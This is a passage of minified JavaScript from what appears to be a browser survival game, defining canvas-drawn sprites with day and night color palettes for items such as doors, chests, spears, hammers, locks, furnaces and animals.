      sprite[Ie.DOOR_AMETHYST_CLOSE][Ie.NIGHT] = te(Rt(1.5, true, ["#030d14", "#8359d3", "#764eb5", "#8f65de", "#7f55cc", "#9d77e6"]));
      sprite[Ie.DOOR_AMETHYST_OPEN] = [];
      sprite[Ie.DOOR_AMETHYST_OPEN][Ie.DAY] = te(Rt(1, false, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"]));
      sprite[Ie.DOOR_AMETHYST_OPEN][Ie.NIGHT] = te(Rt(1, false, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"]));
      sprite[Ie.DOOR_GOLD_CLOSE] = [];
      sprite[Ie.DOOR_GOLD_CLOSE][Ie.DAY] = te(gt(1.5, true, ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#9a8636", "#c1b06b"]));
      sprite[Ie.DOOR_GOLD_CLOSE][Ie.NIGHT] = te(gt(1.5, true, ["#030d14", "#1f4948", "#215e55", "#1f6058", "#1f605c", "#2c7a70"]));
      sprite[Ie.DOOR_GOLD_OPEN] = [];
      sprite[Ie.DOOR_GOLD_OPEN][Ie.DAY] = te(gt(1, false, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"]));
      sprite[Ie.DOOR_GOLD_OPEN][Ie.NIGHT] = te(gt(1, false, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"]));
      sprite[Ie.DOOR_DIAMOND_CLOSE] = [];
      sprite[Ie.DOOR_DIAMOND_CLOSE][Ie.DAY] = te(bt(1.5, true, ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]));
      sprite[Ie.DOOR_DIAMOND_CLOSE][Ie.NIGHT] = te(bt(1.5, true, ["#030d14", "#2b9390", "#43b5af", "#43b5af", "#4bbcb4", "#83ddd4", "#59c9c0"]));
      sprite[Ie.DOOR_DIAMOND_OPEN] = [];
      sprite[Ie.DOOR_DIAMOND_OPEN][Ie.DAY] = te(bt(1, false, ["#133a2b", "#133a2b", "#1a4935", "#1a4935", "#133a2b", "#1a4935"]));
      sprite[Ie.DOOR_DIAMOND_OPEN][Ie.NIGHT] = te(bt(1, false, ["#032428", "#032428", "#07393d", "#07393d", "#032428", "#07393d"]));
      sprite[Ie.CHEST] = [];
      sprite[Ie.CHEST][Ie.DAY] = te(zt(0.5, 0, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"]));
      sprite[Ie.CHEST][Ie.NIGHT] = te(zt(0.5, 0, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453", "#1f5453", "#1f5453", "#2b6664", "#2b6664", "#2b6664"]));
      sprite[Ie.CHEST][2] = te(zt(0.5, 0, "#4d0000 #4d0000 #4d0000 #4d0000 #4d0000 #614627 #614627 #c4a23a #c4a23a #c4a23a".split(" ")));
      sprite[Ie.TREASURE_CHEST] = [];
      sprite[Ie.TREASURE_CHEST][Ie.DAY] = te(an(0.5, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627"]));
      sprite[Ie.TREASURE_CHEST][Ie.NIGHT] = te(an(0.5, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453"]));
      sprite[Ie.RABBIT] = [];
      sprite[Ie.RABBIT][Ie.DAY] = te(ai(0.9, ["#0e3022", "#ee97bf", "#FFFFFF", "#000000", "#ffffff"]));
      sprite[Ie.RABBIT][Ie.NIGHT] = te(ai(0.9, ["#030d14", "#4d1b59", "#5d3f77", "#220e26", "#ffffff"]));
      sprite[Ie.SPIDER] = [];
      sprite[Ie.SPIDER][Ie.DAY] = te(we(Math.PI, _i(0.9, ["#000000", "#b7252c", "#b7252c", "#b7252c", "#FFFFFF", "#000000"])));
      sprite[Ie.SPIDER][Ie.NIGHT] = te(we(Math.PI, _i(0.9, ["#030d14", "#401d49", "#b7252c", "#401d49", "#FFFFFF", "#000000"])));
      sprite[Ie.WEB] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 450;
        t.height = e * 470;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 226.5, e * 91.546875);
        r.bezierCurveTo(e * 254.5, e * 115.546875, e * 261.5, e * 115.546875, e * 294.5, e * 109.546875);
        r.bezierCurveTo(e * 299.5, e * 141.546875, e * 315.5, e * 151.546875, e * 344.5, e * 158.546875);
        r.bezierCurveTo(e * 330.5, e * 195.546875, e * 341.5, e * 207.546875, e * 361.5, e * 226.546875);
        r.bezierCurveTo(e * 331.5, e * 251.546875, e * 335.5, e * 270.546875, e * 342.5, e * 295.546875);
        r.bezierCurveTo(e * 300.5, e * 296.546875, e * 293.5, e * 325.546875, e * 292.5, e * 344.546875);
        r.bezierCurveTo(e * 257.5, e * 326.546875, e * 242.5, e * 338.546875, e * 224.5, e * 361.546875);
        r.bezierCurveTo(e * 200.5, e * 329.546875, e * 180.5, e * 334.546875, e * 155.5, e * 341.546875);
        r.bezierCurveTo(e * 146.5, e * 307.546875, e * 140.5, e * 302.546875, e * 107.5, e * 292.546875);
        r.bezierCurveTo(e * 117.5, e * 253.546875, e * 109.5, e * 244.546875, e * 89.5, e * 224.546875);
        r.bezierCurveTo(e * 118.5, e * 191.546875, e * 114.5, e * 182.546875, e * 108.5, e * 156.546875);
        r.bezierCurveTo(e * 143.5, e * 149.546875, e * 150.5, e * 136.546875, e * 157.5, e * 106.546875);
        r.bezierCurveTo(e * 202.5, e * 120.546875, e * 211.5, e * 103.546875, e * 228.5, e * 91.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 224.5, e * 129.546875);
        r.bezierCurveTo(e * 247.5, e * 147.546875, e * 252.5, e * 143.546875, e * 274.5, e * 141.546875);
        r.bezierCurveTo(e * 279.5, e * 163.546875, e * 289.5, e * 168.546875, e * 311.5, e * 178.546875);
        r.bezierCurveTo(e * 301.5, e * 199.546875, e * 307.5, e * 213.546875, e * 323.5, e * 226.546875);
        r.bezierCurveTo(e * 303.5, e * 240.546875, e * 303.5, e * 255.546875, e * 312.5, e * 275.546875);
        r.bezierCurveTo(e * 281.5, e * 278.546875, e * 276.5, e * 291.546875, e * 272.5, e * 313.546875);
        r.bezierCurveTo(e * 248.5, e * 301.546875, e * 239.5, e * 310.546875, e * 224.5, e * 324.546875);
        r.bezierCurveTo(e * 211.5, e * 304.546875, e * 199.5, e * 301.546875, e * 176.5, e * 309.546875);
        r.bezierCurveTo(e * 165.5, e * 276.546875, e * 159.5, e * 275.546875, e * 138.5, e * 274.546875);
        r.bezierCurveTo(e * 148.5, e * 248.546875, e * 140.5, e * 237.546875, e * 125.5, e * 225.546875);
        r.bezierCurveTo(e * 145.5, e * 205.546875, e * 146.5, e * 195.546875, e * 142.5, e * 176.546875);
        r.bezierCurveTo(e * 173.5, e * 164.546875, e * 173.5, e * 155.546875, e * 178.5, e * 140.546875);
        r.bezierCurveTo(e * 214.5, e * 143.546875, e * 214.5, e * 135.546875, e * 226.5, e * 129.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 224.5, e * 160.546875);
        r.bezierCurveTo(e * 236.5, e * 168.546875, e * 239.5, e * 168.546875, e * 258.5, e * 168.546875);
        r.bezierCurveTo(e * 261.5, e * 185.546875, e * 268.5, e * 187.546875, e * 282.5, e * 192.546875);
        r.bezierCurveTo(e * 277.5, e * 208.546875, e * 283.5, e * 216.546875, e * 289.5, e * 228.546875);
        r.bezierCurveTo(e * 277.5, e * 243.546875, e * 280.5, e * 253.546875, e * 281.5, e * 260.546875);
        r.bezierCurveTo(e * 264.5, e * 260.546875, e * 259.5, e * 269.546875, e * 256.5, e * 283.546875);
        r.bezierCurveTo(e * 244.5, e * 276.546875, e * 232.5, e * 283.546875, e * 223.5, e * 291.546875);
        r.bezierCurveTo(e * 213.5, e * 276.546875, e * 205.5, e * 278.546875, e * 190.5, e * 281.546875);
        r.bezierCurveTo(e * 181.5, e * 262.546875, e * 173.5, e * 259.546875, e * 165.5, e * 258.546875);
        r.bezierCurveTo(e * 169.5, e * 239.546875, e * 167.5, e * 233.546875, e * 157.5, e * 225.546875);
        r.bezierCurveTo(e * 169.5, e * 208.546875, e * 170.5, e * 203.546875, e * 168.5, e * 192.546875);
        r.bezierCurveTo(e * 181.5, e * 187.546875, e * 188.5, e * 179.546875, e * 192.5, e * 168.546875);
        r.bezierCurveTo(e * 216.5, e * 170.546875, e * 218.5, e * 163.546875, e * 225.5, e * 160.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 205.5, e * 194.546875);
        r.bezierCurveTo(e * 216.5, e * 192.546875, e * 219.5, e * 191.546875, e * 225.5, e * 185.546875);
        r.bezierCurveTo(e * 232.5, e * 193.546875, e * 237.5, e * 191.546875, e * 246.5, e * 192.546875);
        r.bezierCurveTo(e * 249.5, e * 202.546875, e * 253.5, e * 205.546875, e * 258.5, e * 207.546875);
        r.bezierCurveTo(e * 259.5, e * 222.546875, e * 256.5, e * 223.546875, e * 265.5, e * 226.546875);
        r.bezierCurveTo(e * 256.5, e * 231.546875, e * 255.5, e * 241.546875, e * 259.5, e * 248.546875);
        r.bezierCurveTo(e * 250.5, e * 245.546875, e * 245.5, e * 252.546875, e * 243.5, e * 260.546875);
        r.bezierCurveTo(e * 234.5, e * 256.546875, e * 229.5, e * 258.546875, e * 223.5, e * 265.546875);
        r.bezierCurveTo(e * 218.5, e * 255.546875, e * 213.5, e * 257.546875, e * 204.5, e * 261.546875);
        r.bezierCurveTo(e * 203.5, e * 251.546875, e * 198.5, e * 248.546875, e * 189.5, e * 244.546875);
        r.bezierCurveTo(e * 194.5, e * 237.546875, e * 192.5, e * 231.546875, e * 184.5, e * 225.546875);
        r.bezierCurveTo(e * 191.5, e * 211.546875, e * 192.5, e * 209.546875, e * 190.5, e * 204.546875);
        r.bezierCurveTo(e * 200.5, e * 204.546875, e * 204.5, e * 198.546875, e * 207.5, e * 194.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 149.5, e * 93.546875);
        r.bezierCurveTo(e * 287.5, e * 332.546875, e * 226, e * 225.546875, e * 302.5, e * 357.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 224.5, e * 66.546875);
        r.bezierCurveTo(e * 224.5, e * 223.546875, e * 224.5, e * 223.546875, e * 224.5, e * 380.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 302.5, e * 88.546875);
        r.bezierCurveTo(e * 222.5, e * 227.546875, e * 222.5, e * 227.546875, e * 142.5, e * 366.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 361.5, e * 147.546875);
        r.bezierCurveTo(e * 223, e * 226.546875, e * 223, e * 226.546875, e * 84.5, e * 305.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 379.5, e * 225.546875);
        r.bezierCurveTo(e * 221, e * 225.546875, e * 221, e * 225.546875, e * 62.5, e * 225.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 90.5, e * 147.546875);
        r.bezierCurveTo(e * 226.5, e * 226.546875, e * 226.5, e * 226.546875, e * 362.5, e * 305.546875);
        r.closePath();
        ye(r, undefined, i[0], 4);
        return t;
      }(0.6, ["#FFFFFF"]));
      sprite[Ie.WOLF] = [];
      sprite[Ie.WOLF][Ie.DAY] = te(oi(1.1, ["#0e3022", "#231f20", "#b7252c", "#7d7679", "#ffffff"]));
      sprite[Ie.WOLF][Ie.NIGHT] = te(oi(1.1, ["#030d14", "#1e181c", "#462966", "#3e3e4a", "#ffffff"]));
      sprite[Ie.EARMUFFS] = [];
      sprite[Ie.EARMUFFS][Ie.DAY] = te(Vt(0.6, 0, ["#f9efeb", "#dfd1cb", "#3e3c25", "#4d4a2e"]));
      sprite[Ie.EARMUFFS][Ie.NIGHT] = te(Vt(0.6, 0, ["#478e8b", "#327e73", "#073030", "#08403f"]));
      sprite[Ie.COAT] = [];
      sprite[Ie.COAT][Ie.DAY] = te(Dt(0.6, 0, ["#3e3c25", "#4d4a2e", "#f9efeb", "#dfd1cb"]));
      sprite[Ie.COAT][Ie.NIGHT] = te(Dt(0.6, 0, ["#073030", "#08403f", "#478e8b", "#327e73"]));
      sprite[Ie.CAP_SCARF] = [];
      sprite[Ie.CAP_SCARF][Ie.DAY] = te(wt(0.63, true, ["#171a19", "#dee7e7", "#b8cccb", "#ffffff", "#e3e8e8"]));
      sprite[Ie.CAP_SCARF][Ie.NIGHT] = te(wt(0.63, true, ["#073030", "#368981", "#1c635e", "#7bbab4", "#469e95"]));
      sprite[Ie.CHRISTMAS_HAT] = [];
      sprite[Ie.CHRISTMAS_HAT][Ie.DAY] = te(Si(0.6, 0, ["#171a19", "#c5232c", "#84191d", "#a72027", "#fef4f4", "#e9dad9"]));
      sprite[Ie.CHRISTMAS_HAT][Ie.NIGHT] = te(Si(0.6, 0, ["#073030", "#392966", "#2a194f", "#433379", "#66aaa3", "#469e95"]));
      sprite[Ie.ELF_HAT] = [];
      sprite[Ie.ELF_HAT][Ie.DAY] = te(Di(0.6, 0, ["#171a19", "#0f964c", "#106e3b", "#138344", "#fef4f4", "#e9dad9", "#C5232C", "#A92D2D"]));
      sprite[Ie.ELF_HAT][Ie.NIGHT] = te(Di(0.6, 0, ["#073030", "#124949", "#0e3838", "#15514f", "#66aaa3", "#469e95", "#292f66", "#202559"]));
      sprite[Ie.BREAD_OVEN_ON] = [];
      sprite[Ie.BREAD_OVEN_ON][Ie.DAY] = te(Yr(0.42, true, ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#343d39"]));
      sprite[Ie.BREAD_OVEN_ON][Ie.NIGHT] = te(Yr(0.42, true, ["#0d1b1c", "#485E66", "#1F343F", "#60757D", "#C1C0C0", "#be8d50", "#7d5234", "#1F343F", "#344B51", "#D8E57F", "#dfa64e", "#192225"]));
      sprite[Ie.BREAD_LIGHT_UP] = [];
      sprite[Ie.BREAD_LIGHT_UP][Ie.DAY] = te(kr(0.9, ["#e4c027"]));
      sprite[Ie.BREAD_LIGHT_UP][Ie.NIGHT] = te(kr(0.9, ["#D8E57F"]));
      sprite[Ie.BREAD_OVEN_OFF] = [];
      sprite[Ie.BREAD_OVEN_OFF][Ie.DAY] = te(Ur(0.42, true, ["#0d1b1c", "#515C57", "#3A4942", "#68736F", "#C1C0C0", "#be8d50", "#7d5234", "#222825", "#4D5752", "#e48727", "#d4a872", "#232a27"]));
      sprite[Ie.BREAD_OVEN_OFF][Ie.NIGHT] = te(Ur(0.42, true, ["#0d1b1c", "#485E66", "#1F343F", "#60757D", "#C1C0C0", "#be8d50", "#7d5234", "#1F343F", "#344B51", "#D8E57F", "#dfa64e", "#1b2529"]));
      sprite[Ie.BREAD_OVEN_UI] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 149;
        t.height = e * 356;
        r.save();
        r.translate(e * 74.5, e * 177.5);
        Be(r, e * -57.5, e * -161.5, e * 100, e * 323, e * 10);
        r.restore();
        ye(r, i[0], i[1], e * 4);
        r.save();
        r.translate(e * 74.5, e * 177.5);
        Be(r, e * -57.5, e * 50.5, e * 100, e * 105, e * 10);
        r.restore();
        ye(r, i[6], i[1], e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 125);
        r.bezierCurveTo(e * 74.5, e * 125, e * 118, e * 125, e * 118, e * 125);
        r.closePath();
        ye(r, i[2], i[2], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 120);
        r.bezierCurveTo(e * 74.5, e * 120, e * 74.5, e * 120, e * 118, e * 120);
        r.closePath();
        ye(r, i[3], i[3], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 228);
        r.bezierCurveTo(e * 75, e * 228.5, e * 118, e * 228.5, e * 118, e * 229);
        r.closePath();
        ye(r, i[2], i[2], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 224);
        r.bezierCurveTo(e * 75, e * 224, e * 118, e * 224, e * 118, e * 224);
        r.closePath();
        ye(r, i[3], i[3], e * 10);
        r.save();
        r.translate(e * 72, e * 68.5);
        Be(r, e * -41.5, e * -36.5, e * 73, e * 73, e * 13);
        r.restore();
        ye(r, i[4]);
        r.save();
        r.translate(e * 72, e * 175.5);
        Be(r, e * -41.5, e * -38.5, e * 73, e * 73, e * 13);
        r.restore();
        ye(r, i[4]);
        r.save();
        r.translate(e * 72, e * 279.5);
        Be(r, e * -41.5, e * -40.5, e * 73, e * 73, e * 13);
        r.restore();
        ye(r, i[4]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 338);
        r.bezierCurveTo(e * 75, e * 338, e * 118, e * 338, e * 118, e * 338);
        r.closePath();
        ye(r, i[2], i[2], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 16, e * 333);
        r.bezierCurveTo(e * 75, e * 333, e * 118, e * 333, e * 118, e * 333);
        r.closePath();
        ye(r, i[3], i[3], e * 10);
        return t;
      }(1, ["#596560", "#394841", "#543B1C", "#694D28", "#7E8A85", "#384740", "#525956"]));
      sprite[Ie.FURNACE_ON] = [];
      sprite[Ie.FURNACE_ON][Ie.DAY] = te(Ct(0.5, true, ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#ffad22", "#fffdd5", "#fee764"]));
      sprite[Ie.FURNACE_ON][Ie.NIGHT] = te(Ct(0.5, true, ["#0d1b1c", "#485e66", "#1f343f", "#60757d", "#ffdc73", "#fffce2", "#fef259"]));
      sprite[Ie.FURNACE_OFF] = [];
      sprite[Ie.FURNACE_OFF][Ie.DAY] = te(Nt(0.5, true, ["#0d1b1c", "#939393", "#5f6061", "#c0c0c0", "#4f4f4f", "#6c6c6c", "#454545"]));
      sprite[Ie.FURNACE_OFF][Ie.NIGHT] = te(Nt(0.5, true, ["#0d1b1c", "#485e66", "#1f343f", "#60757d", "#152229", "#0c1113", "#0c1113"]));
      sprite[Ie.FURNACE_SLOT] = te(function (e, i, t) {
        var r = document.createElement("canvas");
        var n = r.getContext("2d");
        r.width = e * 118;
        r.height = e * 129;
        n.save();
        n.translate(e * 90, e * 90);
        Be(n, e * -86.5, e * -86, e * 110, e * 110, e * 15);
        n.restore();
        ye(n, t[0], t[1], 4);
        return r;
      }(0.8, 0, ["#5f6061", "#939393"]));
      sprite[Ie.FURNACE_BUTTON] = ci(1, [{
        f: Ci,
        x: 0,
        y: 0,
        a: 1,
        r: Math.PI / 2.5,
        c: ["#4d2d14", "#432516"]
      }], 0.3, ["#494949", "#5b5858", "#3d3b3b"], 1);
      sprite[Ie.BED] = [];
      sprite[Ie.BED][Ie.DAY] = te(mt(1, 0, ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99"]));
      sprite[Ie.BED][Ie.NIGHT] = te(mt(1, 0, ["#0d1b1c", "#0b3432", "#092b29", "#052120", "#104d5b", "#0b424f", "#0b3432", "#092b29", "#2b0b4a", "#23073e"]));
      sprite[Ie.BED_TOP] = [];
      sprite[Ie.BED_TOP][Ie.DAY] = te(vt(1, 0, ["#0d1b1c", "#554139", "#3f332a", "#261912", "#eee6c5", "#d1c599", "#554139", "#3f332a", "#86509b", "#703a99"]));
      sprite[Ie.BED_TOP][Ie.NIGHT] = te(vt(1, 0, ["#0d1b1c", "#0b3432", "#092b29", "#052120", "#104d5b", "#083b37", "#0b3432", "#092b29", "#2b0b4a", "#23073e"]));
      sprite[Ie.CRAB_SPEAR] = [];
      sprite[Ie.CRAB_SPEAR][Ie.DAY] = te(we(3, Mt(0.7, true, ["#0d1b1c", "#58452b", "#47341d", "#ee593d", "#c04933", "#c04933", "#a33e2b", "#c3be9a", "#7f6d52"])));
      sprite[Ie.CRAB_SPEAR][Ie.NIGHT] = te(we(3, Mt(0.7, true, ["#0d1b1c", "#0b3432", "#092b29", "#34255d", "#281b4e", "#2f2157", "#281b4e", "#104d5b", "#083b37"])));
      sprite[Ie.WOOD_SPEAR] = [];
      sprite[Ie.WOOD_SPEAR][Ie.DAY] = te(we(3, Lt(0.7, true, ["#0d1b1c", "#58452b", "#47341d", "#765d42", "#c3be9a", "#7f6d52"])));
      sprite[Ie.WOOD_SPEAR][Ie.NIGHT] = te(we(3, Lt(0.7, true, ["#0d1b1c", "#0b3432", "#092b29", "#0e4d49", "#1a6c67", "#07322f"])));
      sprite[Ie.SPEAR] = [];
      sprite[Ie.SPEAR][Ie.DAY] = te(we(3, Gt(0.65, true, ["#0d1b1c", "#4d2d14", "#432516", "#c3be9a", "#7f6d52", "#7a7575", "#454749", "#8c8787", "#939393", "#5f6061", "#aaa6a6"])));
      sprite[Ie.SPEAR][Ie.NIGHT] = te(we(3, Gt(0.65, true, ["#0d1b1c", "#0d2e33", "#0b2326", "#1a6c67", "#07322f", "#374950", "#101f26", "#2c3c42", "#485e66", "#1f343f", "#546e78"])));
      sprite[Ie.GOLD_SPEAR] = [];
      sprite[Ie.GOLD_SPEAR][Ie.DAY] = te(we(3, ft(0.67, true, ["#0d1b1c", "#493e26", "#382e19", "#a69e39", "#9c8828", "#bab143", "#c4bc51", "#b29c32", "#d2ca59"])));
      sprite[Ie.GOLD_SPEAR][Ie.NIGHT] = te(we(3, ft(0.67, true, ["#030d14", "#263947", "#182935", "#33916d", "#197c62", "#3eab81", "#43aa82", "#29997c", "#52be94"])));
      sprite[Ie.DIAMOND_SPEAR] = [];
      sprite[Ie.DIAMOND_SPEAR][Ie.DAY] = te(we(3, Ht(0.67, true, ["#0d1b1c", "#262114", "#211108", "#4ba8b4", "#198a82", "#6ccad7", "#63c9d6", "#29aaa1", "#7bd9e6"])));
      sprite[Ie.DIAMOND_SPEAR][Ie.NIGHT] = te(we(3, Ht(0.67, true, ["#0d1b1c", "#111316", "#0a0b0c", "#4bbbc3", "#23a19d", "#54c5cd", "#4ad2ce", "#3dc4c0", "#73dde5"])));
      sprite[Ie.AMETHYST_SPEAR] = [];
      sprite[Ie.AMETHYST_SPEAR][Ie.DAY] = te(we(3, Pt(0.67, true, ["#0d1b1c", "#262114", "#211108", "#9443b1", "#6f1988", "#a752c6", "#9e35be", "#8c29aa", "#b864d6"])));
      sprite[Ie.AMETHYST_SPEAR][Ie.NIGHT] = te(we(3, Pt(0.67, true, ["#0d1b1c", "#111316", "#0a0b0c", "#6e43bf", "#673fa4", "#784bcc", "#845bc6", "#764eb5", "#966be7"])));
      sprite[Ie.DRAGON_SPEAR] = [];
      sprite[Ie.DRAGON_SPEAR][Ie.DAY] = te(we(3, yt(1, true, ["#0d1b1c", "#1e2b34", "#151c24", "#99d7dd", "#7dcbd1", "#c6e8eb", "#aadee8", "#b7e2e5"])));
      sprite[Ie.DRAGON_SPEAR][Ie.NIGHT] = te(we(3, yt(1, true, ["#0d1b1c", "#1c2026", "#0a0b0c", "#7dc6d9", "#6cbacf", "#87d2e6", "#49b2cf", "#87d2e6"])));
      sprite[Ie.HAMMER] = [];
      sprite[Ie.HAMMER][Ie.DAY] = te(we(3, Ft(1, true, ["#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"])));
      sprite[Ie.HAMMER][Ie.NIGHT] = te(we(3, Ft(1, true, ["#030d14", "#263947", "#182935", "#485e66", "#1f343f"])));
      sprite[Ie.SPANNER] = [];
      sprite[Ie.SPANNER][Ie.DAY] = te(we(3, ln(0.5, true, ["#0d1b1c", "#939393", "#5f6061"])));
      sprite[Ie.SPANNER][Ie.NIGHT] = te(we(3, ln(0.5, true, ["#030d14", "#485e66", "#1f343f"])));
      sprite[Ie.SUPER_HAMMER] = [];
      sprite[Ie.SUPER_HAMMER][Ie.DAY] = te(we(3, yr(1, true, ["#0d1b1c", "#9b5927", "#7a3610", "#1e0302", "#0d825b", "#6bd16e", "#17915d", "#89e5aa", "#16935d", "#a0efc4", "#28b26d", "#cdf4cb"])));
      sprite[Ie.SUPER_HAMMER][Ie.NIGHT] = te(we(3, yr(1, true, ["#0d1b1c", "#2a4f4a", "#1e423d", "#1e0302", "#096b3f", "#3db76f", "#118254", "#40c696", "#0c7a50", "#59d8a4", "#249376", "#80d8c7"])));
      sprite[Ie.HAMMER_GOLD] = [];
      sprite[Ie.HAMMER_GOLD][Ie.DAY] = te(we(3, Ft(1, true, ["#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"])));
      sprite[Ie.HAMMER_GOLD][Ie.NIGHT] = te(we(3, Ft(1, true, ["#0d1b1c", "#0d2e33", "#0b2326", "#43aa82", "#29997c"])));
      sprite[Ie.HAMMER_DIAMOND] = [];
      sprite[Ie.HAMMER_DIAMOND][Ie.DAY] = te(we(3, Ft(1, true, ["#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"])));
      sprite[Ie.HAMMER_DIAMOND][Ie.NIGHT] = te(we(3, Ft(1, true, ["#0d1b1c", "#111316", "#0a0b0c", "#73dde5", "#3dc4c0"])));
      sprite[Ie.HAMMER_AMETHYST] = [];
      sprite[Ie.HAMMER_AMETHYST][Ie.DAY] = te(we(3, Ft(1, true, ["#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"])));
      sprite[Ie.HAMMER_AMETHYST][Ie.NIGHT] = te(we(3, Ft(1, true, ["#0d1b1c", "#111316", "#0a0b0c", "#8359d3", "#764eb5"])));
      sprite[Ie.LOCK] = [];
      sprite[Ie.LOCK][Ie.DAY] = te(br(0.55, 0, ["#141414", "#816511", "#c4a23a", "#3a3a3a"]));
      sprite[Ie.LOCK][Ie.NIGHT] = te(br(0.55, 0, ["#080707", "#133d3c", "#2b6664", "#1b2529"]));
      sprite[Ie.PADLOCK] = [];
      sprite[Ie.PADLOCK].push(te(br(0.8, 0, ["#141414", "#816511", "#c4a23a", "#3a3a3a"])));
      sprite[Ie.PADLOCK].push(te(br(0.8, 0, ["#141414", "#9f7d17", "#dab33c", "#474545"])));
      sprite[Ie.PADLOCK].push(te(br(0.8, 0, ["#141414", "#73590d", "#a88a2c", "#2a2828"])));
      sprite[Ie.LOCKED] = [];
      sprite[Ie.LOCKED].push(sprite[Ie.PADLOCK][0]);
      sprite[Ie.LOCKED].push(sprite[Ie.PADLOCK][0]);
      sprite[Ie.LOCKED].push(sprite[Ie.PADLOCK][0]);
      sprite[Ie.LOCKPICK] = [];
      sprite[Ie.LOCKPICK][Ie.DAY] = te(vr(0.06, 0, ["#141414", "#c4a23a", "#816511"]));
      sprite[Ie.LOCKPICK][Ie.NIGHT] = te(vr(0.06, 0, ["#030d14", "#2b6664", "#133d3c"]));
      sprite[Ie.KEY] = [];
      sprite[Ie.KEY].push(te(vr(0.08, 0, ["#141414", "#c4a23a", "#816511"])));
      sprite[Ie.KEY].push(te(vr(0.08, 0, ["#141414", "#e2bd4e", "#a38018"])));
      sprite[Ie.KEY].push(te(vr(0.08, 0, ["#141414", "#b0902e", "#634d09"])));
      sprite[Ie.DRAGON_HEART] = ci(1.5, [{
        f: Hr,
        x: 0,
        y: 0,
        a: 1,
        r: 0,
        c: ["#141414", "#178a99", "#0a6372", "#03282e"]
      }], 0.45, ["#5bbcc9", "#73d2df", "#4daab6"], 0.9);
      sprite[Ie.RESURRECTION_GROUND] = [];
      sprite[Ie.RESURRECTION_GROUND][Ie.DAY] = te(Mr(0.8, 0, ["#347f93", "#54a4ba"]));
      sprite[Ie.RESURRECTION_GROUND][Ie.NIGHT] = te(Mr(0.8, 0, ["#98ede3", "#94f2e7"]));
      sprite[Ie.RESURRECTION_HOLE] = [];
      sprite[Ie.RESURRECTION_HOLE][Ie.DAY] = te(Lr(0.8, 0, ["#a9e4ed", "#86d4e0", "#418ba5", "#59b8ce"]));
      sprite[Ie.RESURRECTION_HOLE][Ie.NIGHT] = te(Lr(0.8, 0, ["#59c9c0", "#83ddd4", "#3fa097", "#90ddd9"]));
      sprite[Ie.RESURRECTION_ROTATE] = [];
      sprite[Ie.RESURRECTION_ROTATE][Ie.DAY] = te(Gr(0.8, 0, ["#a9e4ed", "#86d4e0"]));
      sprite[Ie.RESURRECTION_ROTATE][Ie.NIGHT] = te(Gr(0.8, 0, ["#83ddd4", "#485e66"]));
      sprite[Ie.RESURRECTION] = [];
      sprite[Ie.RESURRECTION][Ie.DAY] = te(fr(0.8, true, ["#347f93", "#54a4ba", "#1c2528", "#a9e4ed", "#86d4e0", "#959da0", "#697072", "#929da0", "#afb9bc"]));
      sprite[Ie.RESURRECTION][Ie.NIGHT] = te(fr(0.8, true, ["#98ede3", "#94f2e7", "#1f343f", "#59c9c0", "#83ddd4", "#485e66", "#2d484f", "#546d6d", "#597b84"]));
      sprite[Ie.EMERALD_MACHINE_GROUND] = [];
